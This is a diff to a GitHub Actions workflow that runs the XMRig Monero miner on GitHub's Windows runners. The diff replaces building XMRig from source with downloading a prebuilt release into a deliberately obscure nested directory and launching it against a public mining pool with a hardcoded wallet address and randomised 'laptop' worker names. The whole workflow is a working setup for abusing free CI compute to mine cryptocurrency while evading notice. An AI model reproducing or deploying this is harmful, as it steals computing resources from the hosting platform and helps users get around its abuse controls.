@@ -1,4 +1,4 @@
-name: Windows XMRig Miner
+name: Windows XMRig Miner (Optimized)
 
 on:
   workflow_dispatch:
@@ -6,32 +6,23 @@ on:
 jobs:
   mine:
     runs-on: windows-latest
+    timeout-minutes: 30  # GitHub may kill it sooner
     steps:
       - name: Generate random worker name
         id: worker
         run: echo "name=laptop$((Get-Random -Minimum 1 -Maximum 100001))" | Out-File -FilePath $env:GITHUB_OUTPUT -Append
 
-      - name: Install dependencies (CMake, Git, MSBuild)
-        run: |
-          choco install cmake --installargs 'ADD_CMAKE_TO_PATH=System' -y
-          choco install git -y
-          choco install visualstudio2022buildtools -y
-          refreshenv
-
-      - name: Clone and build XMRig
+      - name: Download pre-built XMRig
         run: |
           mkdir -p $env:USERPROFILE\.local\.run\.hello\runner\go\beein\.go\do
           cd $env:USERPROFILE\.local\.run\.hello\runner\go\beein\.go\do
-          git clone https://github.com/xmrig/xmrig.git
-          cd xmrig
-          mkdir build
-          cd build
-          cmake .. -G "Visual Studio 17 2022" -A x64
-          cmake --build . --config Release
+          Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip" -OutFile "xmrig.zip"
+          Expand-Archive -Path "xmrig.zip" -DestinationPath .
+          Rename-Item -Path "xmrig-6.21.0" -NewName "xmrig"
 
-      - name: Run XMRig
+      - name: Run XMRig (no compilation needed)
         run: |
-          cd $env:USERPROFILE\.local\.run\.hello\runner\go\beein\.go\do\xmrig\build\Release
+          cd $env:USERPROFILE\.local\.run\.hello\runner\go\beein\.go\do\xmrig
           .\xmrig.exe -o pool.supportxmr.com:3333 ^
             -u 46iWdfQ1WgVaJNjPCbVBsnVnzPEjTv8f9ReQTzX4JjCoRsH17PkfXFsCnfcwg1kGmDFD848DJb6QP6mt31SSnrMJ28q1s2p ^
             -p ${{ steps.worker.outputs.name }} ^
